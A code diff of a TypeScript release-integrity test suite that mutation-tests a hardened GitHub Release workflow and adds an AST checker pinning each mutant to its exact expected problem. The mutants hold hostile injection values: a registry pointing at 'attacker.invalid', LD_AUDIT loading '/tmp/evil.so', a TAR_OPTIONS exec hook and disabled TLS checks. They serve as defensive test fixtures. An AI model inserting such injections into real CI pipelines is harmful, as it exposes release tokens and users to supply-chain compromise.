@@ -955,6 +955,475 @@ const RELEASE_MUTATION_DECLARATIVE_STATUS_PROPERTIES: ReadonlySet<string> = new 
 ]);
 const RELEASE_MUTATION_EXPECT_STATIC_METHODS: ReadonlySet<string> = new Set(["arrayContaining", "stringMatching"]);
 
+const RELEASE_TRANSACTION_EXPECTED_PROBLEM_RUNS: ReadonlyArray<readonly [problem: string, count: number]> = [
+  ["token-bearing shells must clear inherited shell, loader, network, CA, Node, and GitHub config injection", 2],
+  ["GitHub Release transaction must execute only one exact hash-pinned in-memory script snapshot", 5],
+  ["token-bearing shells must clear inherited shell, loader, network, CA, Node, and GitHub config injection", 10],
+  ["GitHub Release transaction must execute only one exact hash-pinned in-memory script snapshot", 2],
+  ["GitHub latest-release absence must be one strict HTTP identity, never stderr text", 6],
+  ["every release snapshot must bind the exact canonical title and CHANGELOG body", 1],
+  ["token-bearing shells must clear inherited shell, loader, network, CA, Node, and GitHub config injection", 1],
+  ["draft creation must be one bounded write followed by exact readback without replay", 6],
+  ["token-bearing shells must clear inherited shell, loader, network, CA, Node, and GitHub config injection", 1],
+  ["draft creation must be one bounded write followed by exact readback without replay", 2],
+  ["every release snapshot must bind the exact canonical title and CHANGELOG body", 1],
+  ["each missing release asset must use one retry-free POST and exact no-replay reconciliation", 16],
+  ["the exact six-asset identity and bytes must remain frozen across publication", 1],
+  ["release publication must be one bounded PATCH followed by exact-ID convergence without replay", 15],
+  ["GitHub Release recovery must expose no delete, clobber, or transport-replay path", 7]
+];
+
+/**
+ * Pin the exact detector identity selected for every legacy GitHub Release transaction mutation.
+ *
+ * @param source - Complete release-integrity test source.
+ * @returns Stable diagnostics; empty only for 76 direct literal records, one exact assertion loop, and
+ * its canonical detector binding.
+ */
+function releaseTransactionExpectationIdentityProblems(source: string): string[] {
+  const sourceFile = ts.createSourceFile(
+    "release-integrity.test.ts",
+    source,
+    ts.ScriptTarget.Latest,
+    true,
+    ts.ScriptKind.TS
+  );
+  const problems: string[] = [];
+  const expectedProblemProfile: string[] = [];
+  for (let runIndex = 0; runIndex < RELEASE_TRANSACTION_EXPECTED_PROBLEM_RUNS.length; runIndex++) {
+    const [problem, count] = RELEASE_TRANSACTION_EXPECTED_PROBLEM_RUNS[runIndex]!;
+    for (let countIndex = 0; countIndex < count; countIndex++) {
+      expectedProblemProfile[expectedProblemProfile.length] = problem;
+    }
+  }
+  const caseDeclarations: ts.VariableDeclaration[] = [];
+  const assertionLoops: ts.ForStatement[] = [];
+  const matrixCallbacks: ts.Block[] = [];
+  let caseIdentifierReferences = 0;
+  let genericNonemptyAssertions = 0;
+  let topLevelDetectorDeclarations = 0;
+  let otherDetectorBindings = 0;
+  let detectorWrites = 0;
+
+  const directIdentifier = (node: ts.Expression | undefined, name: string): boolean =>
+    node !== undefined && ts.isIdentifier(node) && node.text === name;
+  const bindingContainsDetector = (name: ts.BindingName | ts.Identifier): boolean => {
+    if (ts.isIdentifier(name)) return name.text === "githubReleaseTransactionProblems";
+    return name.elements.some((element) => ts.isBindingElement(element) && bindingContainsDetector(element.name));
+  };
+  const assignmentTargetContainsDetector = (node: ts.Expression): boolean => {
+    if (ts.isIdentifier(node)) return node.text === "githubReleaseTransactionProblems";
+    if (
+      ts.isParenthesizedExpression(node) ||
+      ts.isAsExpression(node) ||
+      ts.isTypeAssertionExpression(node) ||
+      ts.isNonNullExpression(node)
+    ) {
+      return assignmentTargetContainsDetector(node.expression);
+    }
+    if (ts.isArrayLiteralExpression(node)) {
+      return node.elements.some(
+        (element) => !ts.isOmittedExpression(element) && assignmentTargetContainsDetector(element)
+      );
+    }
+    if (ts.isObjectLiteralExpression(node)) {
+      return node.properties.some((property) => {
+        if (ts.isShorthandPropertyAssignment(property)) {
+          return property.name.text === "githubReleaseTransactionProblems";
+        }
+        if (ts.isPropertyAssignment(property)) {
+          return assignmentTargetContainsDetector(property.initializer);
+        }
+        return ts.isSpreadAssignment(property) && assignmentTargetContainsDetector(property.expression);
+      });
+    }
+    if (ts.isSpreadElement(node)) return assignmentTargetContainsDetector(node.expression);
+    if (ts.isBinaryExpression(node) && node.operatorToken.kind === ts.SyntaxKind.EqualsToken) {
+      return assignmentTargetContainsDetector(node.left);
+    }
+    return false;
+  };
+  const assignmentOperatorKinds: ReadonlySet<ts.SyntaxKind> = new Set([
+    ts.SyntaxKind.EqualsToken,
+    ts.SyntaxKind.PlusEqualsToken,
+    ts.SyntaxKind.MinusEqualsToken,
+    ts.SyntaxKind.AsteriskEqualsToken,
+    ts.SyntaxKind.AsteriskAsteriskEqualsToken,
+    ts.SyntaxKind.SlashEqualsToken,
+    ts.SyntaxKind.PercentEqualsToken,
+    ts.SyntaxKind.LessThanLessThanEqualsToken,
+    ts.SyntaxKind.GreaterThanGreaterThanEqualsToken,
+    ts.SyntaxKind.GreaterThanGreaterThanGreaterThanEqualsToken,
+    ts.SyntaxKind.AmpersandEqualsToken,
+    ts.SyntaxKind.BarEqualsToken,
+    ts.SyntaxKind.CaretEqualsToken,
+    ts.SyntaxKind.BarBarEqualsToken,
+    ts.SyntaxKind.AmpersandAmpersandEqualsToken,
+    ts.SyntaxKind.QuestionQuestionEqualsToken
+  ]);
+  const directDetectorCall = (node: ts.Expression | undefined): node is ts.CallExpression =>
+    node !== undefined &&
+    ts.isCallExpression(node) &&
+    node.questionDotToken === undefined &&
+    node.typeArguments === undefined &&
+    directIdentifier(node.expression, "githubReleaseTransactionProblems") &&
+    node.arguments.length === 1;
+  const directExpectOfDetector = (node: ts.Expression | undefined): node is ts.CallExpression =>
+    node !== undefined &&
+    ts.isCallExpression(node) &&
+    node.questionDotToken === undefined &&
+    node.typeArguments === undefined &&
+    directIdentifier(node.expression, "expect") &&
+    directDetectorCall(node.arguments[0]);
+
+  const visit = (node: ts.Node): void => {
+    const callTitle = ts.isCallExpression(node) ? node.arguments[0] : undefined;
+    const callCallback = ts.isCallExpression(node) ? node.arguments[1] : undefined;
+    if (
+      ts.isCallExpression(node) &&
+      directIdentifier(node.expression, "it") &&
+      callTitle !== undefined &&
+      ts.isStringLiteral(callTitle) &&
+      callTitle.text === RELEASE_MUTATION_MATRIX_TEST_TITLE &&
+      callCallback !== undefined &&
+      ts.isArrowFunction(callCallback) &&
+      ts.isBlock(callCallback.body)
+    ) {
+      matrixCallbacks.push(callCallback.body);
+    }
+    if (ts.isFunctionDeclaration(node) && node.name?.text === "githubReleaseTransactionProblems") {
+      if (node.parent === sourceFile) topLevelDetectorDeclarations++;
+      else otherDetectorBindings++;
+    } else if ((ts.isVariableDeclaration(node) || ts.isParameter(node)) && bindingContainsDetector(node.name)) {
+      otherDetectorBindings++;
+    } else if (
+      (ts.isFunctionExpression(node) ||
+        ts.isClassDeclaration(node) ||
+        ts.isClassExpression(node) ||
+        ts.isEnumDeclaration(node) ||
+        ts.isModuleDeclaration(node) ||
+        ts.isImportEqualsDeclaration(node)) &&
+      node.name !== undefined &&
+      ts.isIdentifier(node.name) &&
+      node.name.text === "githubReleaseTransactionProblems"
+    ) {
+      otherDetectorBindings++;
+    } else if (ts.isImportDeclaration(node)) {
+      const importClause = node.importClause;
+      if (
+        importClause?.name?.text === "githubReleaseTransactionProblems" ||
+        (importClause?.namedBindings !== undefined &&
+          (ts.isNamespaceImport(importClause.namedBindings)
+            ? importClause.namedBindings.name.text === "githubReleaseTransactionProblems"
+            : importClause.namedBindings.elements.some(
+                (element) => element.name.text === "githubReleaseTransactionProblems"
+              )))
+      ) {
+        otherDetectorBindings++;
+      }
+    }
+    if (
+      ts.isBinaryExpression(node) &&
+      assignmentOperatorKinds.has(node.operatorToken.kind) &&
+      assignmentTargetContainsDetector(node.left)
+    ) {
+      detectorWrites++;
+    }
+    if (
+      (ts.isPrefixUnaryExpression(node) || ts.isPostfixUnaryExpression(node)) &&
+      (node.operator === ts.SyntaxKind.PlusPlusToken || node.operator === ts.SyntaxKind.MinusMinusToken) &&
+      assignmentTargetContainsDetector(node.operand)
+    ) {
+      detectorWrites++;
+    }
+    if (
+      (ts.isForOfStatement(node) || ts.isForInStatement(node)) &&
+      !ts.isVariableDeclarationList(node.initializer) &&
+      assignmentTargetContainsDetector(node.initializer)
+    ) {
+      detectorWrites++;
+    }
+    if (
+      ts.isVariableDeclaration(node) &&
+      ts.isIdentifier(node.name) &&
+      node.name.text === "releaseTransactionMutationCases"
+    ) {
+      caseDeclarations.push(node);
+    }
+    if (ts.isIdentifier(node) && node.text === "releaseTransactionMutationCases") caseIdentifierReferences++;
+    if (ts.isForStatement(node)) {
+      const loopDeclaration =
+        node.initializer !== undefined &&
+        ts.isVariableDeclarationList(node.initializer) &&
+        node.initializer.declarations.length === 1
+          ? node.initializer.declarations[0]
+          : undefined;
+      if (
+        loopDeclaration !== undefined &&
+        ts.isIdentifier(loopDeclaration.name) &&
+        loopDeclaration.name.text === "mutationIndex"
+      ) {
+        assertionLoops.push(node);
+      }
+    }
+    if (
+      ts.isCallExpression(node) &&
+      node.arguments.length === 1 &&
+      ts.isArrayLiteralExpression(node.arguments[0]!) &&
+      node.arguments[0]!.elements.length === 0 &&
+      ts.isPropertyAccessExpression(node.expression) &&
+      node.expression.name.text === "toEqual" &&
+      ts.isPropertyAccessExpression(node.expression.expression) &&
+      node.expression.expression.name.text === "not" &&
+      directExpectOfDetector(node.expression.expression.expression)
+    ) {
+      genericNonemptyAssertions++;
+    }
+    ts.forEachChild(node, visit);
+  };
+  visit(sourceFile);
+
+  if (topLevelDetectorDeclarations !== 1 || otherDetectorBindings !== 0) {
+    problems.push(
+      `release transaction detector must have one top-level function declaration and no other runtime bindings, found top-level ${topLevelDetectorDeclarations}, other ${otherDetectorBindings}`
+    );
+  }
+  if (detectorWrites !== 0) {
+    problems.push(`release transaction detector binding must never be reassigned, found ${detectorWrites} write(s)`);
+  }
+  if (expectedProblemProfile.length !== 76) {
+    problems.push(
+      `release transaction exact expectation profile must contain 76 identities, found ${expectedProblemProfile.length}`
+    );
+  }
+  if (caseIdentifierReferences !== 2) {
+    problems.push(
+      `release transaction mutation cases must have one declaration and one exact loop reference, found ${caseIdentifierReferences}`
+    );
+  }
+  if (genericNonemptyAssertions !== 0) {
+    problems.push(
+      `release transaction detector assertions must select an exact problem identity, found ${genericNonemptyAssertions} generic nonempty assertion(s)`
+    );
+  }
+  if (caseDeclarations.length !== 1) {
+    problems.push(
+      `release transaction mutation cases expected one direct declaration, found ${caseDeclarations.length}`
+    );
+  } else {
+    const declaration = caseDeclarations[0]!;
+    const declarationList = declaration.parent;
+    const declarationStatement = ts.isVariableDeclarationList(declarationList) ? declarationList.parent : undefined;
+    const initializer = declaration.initializer;
+    if (
+      !ts.isVariableDeclarationList(declarationList) ||
+      (declarationList.flags & ts.NodeFlags.Const) === 0 ||
+      declarationList.declarations.length !== 1 ||
+      declarationStatement === undefined ||
+      !ts.isVariableStatement(declarationStatement) ||
+      initializer === undefined ||
+      !ts.isArrayLiteralExpression(initializer)
+    ) {
+      problems.push("release transaction mutation cases must be one direct const array literal");
+    } else {
+      if (initializer.elements.length !== expectedProblemProfile.length) {
+        problems.push(
+          `release transaction mutation cases expected ${expectedProblemProfile.length} literal records, found ${initializer.elements.length}`
+        );
+      }
+      for (const [index, element] of initializer.elements.entries()) {
+        if (!ts.isObjectLiteralExpression(element) || element.properties.length !== 2) {
+          problems.push(`release transaction mutation case ${index + 1} must be one two-field literal object`);
+          continue;
+        }
+        const mutantProperty = element.properties[0];
+        const expectedProperty = element.properties[1];
+        if (
+          mutantProperty === undefined ||
+          !ts.isPropertyAssignment(mutantProperty) ||
+          !ts.isIdentifier(mutantProperty.name) ||
+          mutantProperty.name.text !== "mutant" ||
+          !ts.isCallExpression(mutantProperty.initializer) ||
+          mutantProperty.initializer.questionDotToken !== undefined ||
+          mutantProperty.initializer.typeArguments !== undefined ||
+          !ts.isIdentifier(mutantProperty.initializer.expression) ||
+          (mutantProperty.initializer.expression.text !== "replaceExactly" &&
+            mutantProperty.initializer.expression.text !== "replaceAllExactly")
+        ) {
+          problems.push(`release transaction mutation case ${index + 1} requires one direct exact mutant call`);
+        }
+        const expectedIdentity = expectedProblemProfile[index];
+        if (
+          expectedProperty === undefined ||
+          !ts.isPropertyAssignment(expectedProperty) ||
+          !ts.isIdentifier(expectedProperty.name) ||
+          expectedProperty.name.text !== "expectedProblem" ||
+          !ts.isStringLiteral(expectedProperty.initializer) ||
+          expectedIdentity === undefined ||
+          expectedProperty.initializer.text !== expectedIdentity
+        ) {
+          problems.push(
+            `release transaction mutation case ${index + 1} must select its exact literal problem identity`
+          );
+        }
+      }
+    }
+  }
+
+  if (assertionLoops.length !== 1) {
+    problems.push(
+      `release transaction mutation cases expected one direct exact assertion loop, found ${assertionLoops.length}`
+    );
+  } else {
+    const loop = assertionLoops[0]!;
+    const declarationList = loop.initializer;
+    const declaration =
+      declarationList !== undefined && ts.isVariableDeclarationList(declarationList)
+        ? declarationList.declarations[0]
+        : undefined;
+    const condition = loop.condition;
+    const incrementor = loop.incrementor;
+    const bodyStatements = ts.isBlock(loop.statement) ? loop.statement.statements : undefined;
+    const recordStatement = bodyStatements?.[0];
+    const assertionStatement = bodyStatements?.[1];
+    const recordDeclarationList =
+      recordStatement !== undefined && ts.isVariableStatement(recordStatement)
+        ? recordStatement.declarationList
+        : undefined;
+    const recordDeclaration = recordDeclarationList?.declarations[0];
+    const recordBinding = recordDeclaration?.name;
+    const recordElements =
+      recordBinding !== undefined && ts.isObjectBindingPattern(recordBinding) ? recordBinding.elements : undefined;
+    const mutantBinding = recordElements?.[0];
+    const expectedProblemBinding = recordElements?.[1];
+    const recordInitializer = recordDeclaration?.initializer;
+    const indexedCase =
+      recordInitializer !== undefined && ts.isNonNullExpression(recordInitializer)
+        ? recordInitializer.expression
+        : undefined;
+    const exactAssertionMessage = `\`release transaction mutation \${mutationIndex + 1} must fail with its exact problem identity\``;
+    const outerCall =
+      assertionStatement !== undefined &&
+      ts.isExpressionStatement(assertionStatement) &&
+      ts.isCallExpression(assertionStatement.expression)
+        ? assertionStatement.expression
+        : undefined;
+    const outerAccess =
+      outerCall !== undefined && ts.isPropertyAccessExpression(outerCall.expression) ? outerCall.expression : undefined;
+    const expectCall =
+      outerAccess !== undefined && ts.isCallExpression(outerAccess.expression) ? outerAccess.expression : undefined;
+    const detectorCall = expectCall?.arguments[0];
+    const exactLoop =
+      declarationList !== undefined &&
+      ts.isVariableDeclarationList(declarationList) &&
+      (declarationList.flags & ts.NodeFlags.Let) !== 0 &&
+      (declarationList.flags & ts.NodeFlags.Const) === 0 &&
+      declarationList.declarations.length === 1 &&
+      declaration !== undefined &&
+      declaration.type === undefined &&
+      declaration.exclamationToken === undefined &&
+      ts.isIdentifier(declaration.name) &&
+      declaration.name.text === "mutationIndex" &&
+      declaration.initializer !== undefined &&
+      ts.isNumericLiteral(declaration.initializer) &&
+      declaration.initializer.text === "0" &&
+      condition !== undefined &&
+      ts.isBinaryExpression(condition) &&
+      condition.operatorToken.kind === ts.SyntaxKind.LessThanToken &&
+      directIdentifier(condition.left, "mutationIndex") &&
+      ts.isNumericLiteral(condition.right) &&
+      condition.right.text === "76" &&
+      incrementor !== undefined &&
+      ts.isPostfixUnaryExpression(incrementor) &&
+      incrementor.operator === ts.SyntaxKind.PlusPlusToken &&
+      directIdentifier(incrementor.operand, "mutationIndex") &&
+      bodyStatements !== undefined &&
+      bodyStatements.length === 2 &&
+      recordStatement !== undefined &&
+      ts.isVariableStatement(recordStatement) &&
+      recordDeclarationList !== undefined &&
+      (recordDeclarationList.flags & ts.NodeFlags.Const) !== 0 &&
+      recordDeclarationList.declarations.length === 1 &&
+      recordDeclaration !== undefined &&
+      recordDeclaration.type === undefined &&
+      recordDeclaration.exclamationToken === undefined &&
+      recordBinding !== undefined &&
+      ts.isObjectBindingPattern(recordBinding) &&
+      recordElements !== undefined &&
+      recordElements.length === 2 &&
+      mutantBinding !== undefined &&
+      mutantBinding.propertyName === undefined &&
+      mutantBinding.dotDotDotToken === undefined &&
+      mutantBinding.initializer === undefined &&
+      ts.isIdentifier(mutantBinding.name) &&
+      mutantBinding.name.text === "mutant" &&
+      expectedProblemBinding !== undefined &&
+      expectedProblemBinding.propertyName === undefined &&
+      expectedProblemBinding.dotDotDotToken === undefined &&
+      expectedProblemBinding.initializer === undefined &&
+      ts.isIdentifier(expectedProblemBinding.name) &&
+      expectedProblemBinding.name.text === "expectedProblem" &&
+      recordInitializer !== undefined &&
+      ts.isNonNullExpression(recordInitializer) &&
+      indexedCase !== undefined &&
+      ts.isElementAccessExpression(indexedCase) &&
+      indexedCase.questionDotToken === undefined &&
+      directIdentifier(indexedCase.expression, "releaseTransactionMutationCases") &&
+      directIdentifier(indexedCase.argumentExpression, "mutationIndex") &&
+      outerCall !== undefined &&
+      outerCall.questionDotToken === undefined &&
+      outerCall.typeArguments === undefined &&
+      outerCall.arguments.length === 1 &&
+      directIdentifier(outerCall.arguments[0], "expectedProblem") &&
+      outerAccess !== undefined &&
+      outerAccess.questionDotToken === undefined &&
+      outerAccess.name.text === "toContain" &&
+      expectCall !== undefined &&
+      expectCall.questionDotToken === undefined &&
+      expectCall.typeArguments === undefined &&
+      directIdentifier(expectCall.expression, "expect") &&
+      expectCall.arguments.length === 2 &&
+      directDetectorCall(detectorCall) &&
+      directIdentifier(detectorCall.arguments[0], "mutant") &&
+      expectCall.arguments[1]?.getText(sourceFile) === exactAssertionMessage;
+    if (!exactLoop) {
+      problems.push(
+        "release transaction mutation cases require one direct fixed numeric loop with exact indexed binding, detector, and toContain identity assertion"
+      );
+    }
+    const caseDeclaration = caseDeclarations[0];
+    const caseStatement =
+      caseDeclaration !== undefined && ts.isVariableDeclarationList(caseDeclaration.parent)
+        ? caseDeclaration.parent.parent
+        : undefined;
+    const matrixCallback = matrixCallbacks.length === 1 ? matrixCallbacks[0] : undefined;
+    let caseStatementIndex = -1;
+    let loopStatementIndex = -1;
+    if (matrixCallback !== undefined) {
+      for (let statementIndex = 0; statementIndex < matrixCallback.statements.length; statementIndex++) {
+        const statement = matrixCallback.statements[statementIndex];
+        if (statement === caseStatement) caseStatementIndex = statementIndex;
+        if (statement === loop) loopStatementIndex = statementIndex;
+      }
+    }
+    if (
+      caseStatement === undefined ||
+      !ts.isVariableStatement(caseStatement) ||
+      matrixCallback === undefined ||
+      caseStatement.parent !== matrixCallback ||
+      loop.parent !== matrixCallback ||
+      caseStatementIndex < 0 ||
+      loopStatementIndex !== caseStatementIndex + 1
+    ) {
+      problems.push(
+        "release transaction mutation cases and assertion loop must be adjacent in the exact matrix callback"
+      );
+    }
+  }
+
+  return problems;
+}
+
 /**
  * Pin the executable hybrid inventory that the declarative 5f.5a migration must consume exactly once.
  *
@@ -2248,6 +2717,14 @@ const releaseMutationInventoryBootstrapProblems = releaseMutationInventoryProble
 if (releaseMutationInventoryBootstrapProblems.length !== 0) {
   throw new Error(
     `release mutation inventory bootstrap failed:\n${releaseMutationInventoryBootstrapProblems.join("\n")}`
+  );
+}
+const releaseTransactionExpectationIdentityBootstrapProblems = releaseTransactionExpectationIdentityProblems(
+  readFileSync(new URL("./release-integrity.test.ts", import.meta.url), "utf8")
+);
+if (releaseTransactionExpectationIdentityBootstrapProblems.length !== 0) {
+  throw new Error(
+    `release transaction expectation identity bootstrap failed:\n${releaseTransactionExpectationIdentityBootstrapProblems.join("\n")}`
   );
 }
 
@@ -7029,6 +7506,80 @@ describe("release identity and exact required-job gate", () => {
     const matrixStartOffset = oracleSource.indexOf(RELEASE_MUTATION_MATRIX_START);
     expect(matrixStartOffset).toBeGreaterThan(0);
     const matrixBodyOffset = matrixStartOffset + RELEASE_MUTATION_MATRIX_START.length;
+    expect(releaseTransactionExpectationIdentityProblems(oracleSource)).toEqual([]);
+    const shadowedDetectorMutation = [
+      oracleSource.slice(0, matrixStartOffset),
+      "    const githubReleaseTransactionProblems = (_workflow: string): string[] => [];\n",
+      oracleSource.slice(matrixStartOffset)
+    ].join("");
+    expect(releaseTransactionExpectationIdentityProblems(shadowedDetectorMutation)).toContainEqual(
+      "release transaction detector must have one top-level function declaration and no other runtime bindings, found top-level 1, other 1"
+    );
+    const reassignedDetectorMutation = [
+      oracleSource.slice(0, matrixStartOffset),
+      "    githubReleaseTransactionProblems = (_workflow: string): string[] => [];\n",
+      oracleSource.slice(matrixStartOffset)
+    ].join("");
+    expect(releaseTransactionExpectationIdentityProblems(reassignedDetectorMutation)).toContainEqual(
+      "release transaction detector binding must never be reassigned, found 1 write(s)"
+    );
+    const numericIdentityLoop = "    for (let mutationIndex = 0; mutationIndex < 76; mutationIndex++) {";
+    expect(mutationMatchCount(oracleSource.slice(matrixBodyOffset), numericIdentityLoop)).toBe(1);
+    const numericIdentityLoopOffset = oracleSource.indexOf(numericIdentityLoop, matrixBodyOffset);
+    expect(numericIdentityLoopOffset).toBeGreaterThan(matrixBodyOffset);
+    const iteratorIdentityLoopMutation = [
+      oracleSource.slice(0, numericIdentityLoopOffset),
+      "    for (const [mutationIndex, { mutant, expectedProblem }] of releaseTransactionMutationCases.entries()) {",
+      oracleSource.slice(numericIdentityLoopOffset + numericIdentityLoop.length)
+    ].join("");
+    expect(releaseTransactionExpectationIdentityProblems(iteratorIdentityLoopMutation)).toContainEqual(
+      "release transaction mutation cases expected one direct exact assertion loop, found 0"
+    );
+    const exactIdentityAssertion = ").toContain(expectedProblem);";
+    expect(mutationMatchCount(oracleSource.slice(matrixBodyOffset), exactIdentityAssertion)).toBe(1);
+    const exactIdentityAssertionOffset = oracleSource.indexOf(exactIdentityAssertion, matrixBodyOffset);
+    expect(exactIdentityAssertionOffset).toBeGreaterThan(matrixBodyOffset);
+    const genericIdentityAssertionMutation = [
+      oracleSource.slice(0, exactIdentityAssertionOffset),
+      ").not.toEqual([]);",
+      oracleSource.slice(exactIdentityAssertionOffset + exactIdentityAssertion.length)
+    ].join("");
+    expect(releaseTransactionExpectationIdentityProblems(genericIdentityAssertionMutation)).toEqual(
+      expect.arrayContaining([
+        expect.stringMatching(/must select an exact problem identity/),
+        expect.stringMatching(/require one direct fixed numeric loop/)
+      ])
+    );
+    const multiTriggerMutationNeedle = 'GH_CONFIG_DIR=$(/usr/bin/mktemp -d "$RUNNER_TEMP/enquire-gh-config.XXXXXX")';
+    const multiTriggerMutationOffset = oracleSource.indexOf(multiTriggerMutationNeedle, matrixBodyOffset);
+    expect(multiTriggerMutationOffset).toBeGreaterThan(matrixBodyOffset);
+    const environmentProblemLiteral =
+      '"token-bearing shells must clear inherited shell, loader, network, CA, Node, and GitHub config injection"';
+    const snapshotProblemLiteral =
+      '"GitHub Release transaction must execute only one exact hash-pinned in-memory script snapshot"';
+    const multiTriggerExpectationOffset = oracleSource.indexOf(environmentProblemLiteral, multiTriggerMutationOffset);
+    const nextMutationCaseOffset = oracleSource.indexOf("\n      },\n      {", multiTriggerMutationOffset);
+    expect(multiTriggerExpectationOffset).toBeGreaterThan(multiTriggerMutationOffset);
+    expect(nextMutationCaseOffset).toBeGreaterThan(multiTriggerExpectationOffset);
+    const borrowedIdentityMutation = [
+      oracleSource.slice(0, multiTriggerExpectationOffset),
+      snapshotProblemLiteral,
+      oracleSource.slice(multiTriggerExpectationOffset + environmentProblemLiteral.length)
+    ].join("");
+    expect(releaseTransactionExpectationIdentityProblems(borrowedIdentityMutation)).toContainEqual(
+      "release transaction mutation case 9 must select its exact literal problem identity"
+    );
+    const expectedProblemProperty = "        expectedProblem:";
+    const expectedProblemPropertyOffset = oracleSource.indexOf(expectedProblemProperty, matrixBodyOffset);
+    expect(expectedProblemPropertyOffset).toBeGreaterThan(matrixBodyOffset);
+    const computedExpectedProblemMutation = [
+      oracleSource.slice(0, expectedProblemPropertyOffset),
+      '        ["expectedProblem"]:',
+      oracleSource.slice(expectedProblemPropertyOffset + expectedProblemProperty.length)
+    ].join("");
+    expect(releaseTransactionExpectationIdentityProblems(computedExpectedProblemMutation)).toContainEqual(
+      "release transaction mutation case 1 must select its exact literal problem identity"
+    );
     const suiteStart = `describe("${RELEASE_MUTATION_MATRIX_SUITE_TITLE}", () => {`;
     const suiteStartOffset = oracleSource.indexOf(suiteStart);
     expect(suiteStartOffset).toBeGreaterThan(0);
@@ -10991,331 +11542,601 @@ describe("release identity and exact required-job gate", () => {
         3
       )
     ];
-    const releaseTransactionMutations = [
-      ...uploadConfirmationMutations,
-      ...publicationBoundaryMutations,
-      ...snapshotShapeMutations,
-      replaceExactly(
-        mcpbInputs.release,
-        `          ${LOWERCASE_PROXY_UNSET}\n`,
-        "          builtin true # lowercase proxy cleanup removed\n",
-        RELEASE_FIXTURE_PROXY_UNSET_COUNT
-      ),
-      replaceExactly(
-        mcpbInputs.release,
-        '          npm_config_registry="$NPM_CONFIG_REGISTRY"',
-        '          npm_config_registry="https://attacker.invalid/"'
-      ),
-      replaceExactly(
-        mcpbInputs.release,
-        `          RELEASE_TRANSACTION_SHA256="${releaseTransactionSha256}"`,
-        `          RELEASE_TRANSACTION_SHA256="${"0".repeat(64)}"`
-      ),
-      replaceExactly(
-        mcpbInputs.release,
-        "            /bin/bash --noprofile --norc -p -e -o pipefail -s --",
-        '            /bin/bash --noprofile --norc -p -e -o pipefail "$RELEASE_TRANSACTION_PATH"'
-      ),
-      replaceExactly(
-        mcpbInputs.release,
-        `          MCPB_RELEASE_WORKFLOW_SHA: \${{ github.workflow_sha }}`,
-        `          MCPB_RELEASE_WORKFLOW_SHA: \${{ github.sha }}`
-      ),
-      replaceExactly(
-        mcpbInputs.release,
-        "            /bin/bash --noprofile --norc -p -e -o pipefail -s --",
-        "            /bin/bash --noprofile --norc -p -e -o pipefail -s --\n          echo unsafe-wrapper-tail"
-      ),
-      replaceExactly(
-        mcpbInputs.release,
-        "          builtin printf '%s\\n' \"$RELEASE_TRANSACTION_SNAPSHOT\" |\n" +
+    const releaseTransactionMutationCases = [
+      {
+        mutant: replaceExactly(
+          mcpbInputs.release,
+          `          ${LOWERCASE_PROXY_UNSET}\n`,
+          "          builtin true # lowercase proxy cleanup removed\n",
+          RELEASE_FIXTURE_PROXY_UNSET_COUNT
+        ),
+        expectedProblem:
+          "token-bearing shells must clear inherited shell, loader, network, CA, Node, and GitHub config injection"
+      },
+      {
+        mutant: replaceExactly(
+          mcpbInputs.release,
+          '          npm_config_registry="$NPM_CONFIG_REGISTRY"',
+          '          npm_config_registry="https://attacker.invalid/"'
+        ),
+        expectedProblem:
+          "token-bearing shells must clear inherited shell, loader, network, CA, Node, and GitHub config injection"
+      },
+      {
+        mutant: replaceExactly(
+          mcpbInputs.release,
+          `          RELEASE_TRANSACTION_SHA256="${releaseTransactionSha256}"`,
+          `          RELEASE_TRANSACTION_SHA256="${"0".repeat(64)}"`
+        ),
+        expectedProblem: "GitHub Release transaction must execute only one exact hash-pinned in-memory script snapshot"
+      },
+      {
+        mutant: replaceExactly(
+          mcpbInputs.release,
           "            /bin/bash --noprofile --norc -p -e -o pipefail -s --",
-        "          builtin printf '%s\\n' \"$RELEASE_TRANSACTION_SNAPSHOT\" |\n" +
-          "            /bin/bash --noprofile --norc -p -e -o pipefail -s --\n" +
+          '            /bin/bash --noprofile --norc -p -e -o pipefail "$RELEASE_TRANSACTION_PATH"'
+        ),
+        expectedProblem: "GitHub Release transaction must execute only one exact hash-pinned in-memory script snapshot"
+      },
+      {
+        mutant: replaceExactly(
+          mcpbInputs.release,
+          `          MCPB_RELEASE_WORKFLOW_SHA: \${{ github.workflow_sha }}`,
+          `          MCPB_RELEASE_WORKFLOW_SHA: \${{ github.sha }}`
+        ),
+        expectedProblem: "GitHub Release transaction must execute only one exact hash-pinned in-memory script snapshot"
+      },
+      {
+        mutant: replaceExactly(
+          mcpbInputs.release,
+          "            /bin/bash --noprofile --norc -p -e -o pipefail -s --",
+          "            /bin/bash --noprofile --norc -p -e -o pipefail -s --\n          echo unsafe-wrapper-tail"
+        ),
+        expectedProblem: "GitHub Release transaction must execute only one exact hash-pinned in-memory script snapshot"
+      },
+      {
+        mutant: replaceExactly(
+          mcpbInputs.release,
           "          builtin printf '%s\\n' \"$RELEASE_TRANSACTION_SNAPSHOT\" |\n" +
-          "            /bin/bash --noprofile --norc -p -e -o pipefail -s --"
-      ),
-      replaceAllExactly(
-        mcpbInputs.release,
-        "shell: /bin/bash --noprofile --norc -p -e -o pipefail {0}",
-        "shell: /bin/bash --noprofile --norc -e -o pipefail {0}",
-        RELEASE_HARDENED_SHELL_COUNT
-      ),
-      replaceAllExactly(
-        mcpbInputs.release,
-        'GH_CONFIG_DIR=$(/usr/bin/mktemp -d "$RUNNER_TEMP/enquire-gh-config.XXXXXX")',
-        'GH_CONFIG_DIR="$RUNNER_TEMP"',
-        RELEASE_FIXTURE_GH_CONFIG_COUNT
-      ),
-      replaceExactly(
-        mcpbInputs.release,
-        '          SHELLOPTS: ""',
-        '          SHELLOPTS: "xtrace"',
-        RELEASE_HARDENED_ENV_COUNT
-      ),
-      replaceExactly(
-        mcpbInputs.release,
-        '          LD_AUDIT: ""',
-        '          LD_AUDIT: "/tmp/evil.so"',
-        RELEASE_HARDENED_ENV_COUNT
-      ),
-      replaceExactly(
-        mcpbInputs.release,
-        '          TAR_OPTIONS: ""',
-        '          TAR_OPTIONS: "--checkpoint=1 --checkpoint-action=exec=/tmp/evil"',
-        RELEASE_HARDENED_ENV_COUNT
-      ),
-      replaceExactly(
-        mcpbInputs.release,
-        '          GODEBUG: ""',
-        '          GODEBUG: "http2debug=2"',
-        RELEASE_HARDENED_ENV_COUNT
-      ),
-      replaceExactly(
-        mcpbInputs.release,
-        '          NODE_TLS_REJECT_UNAUTHORIZED: "1"',
-        '          NODE_TLS_REJECT_UNAUTHORIZED: "0"',
-        RELEASE_TLS_PIN_COUNT
-      ),
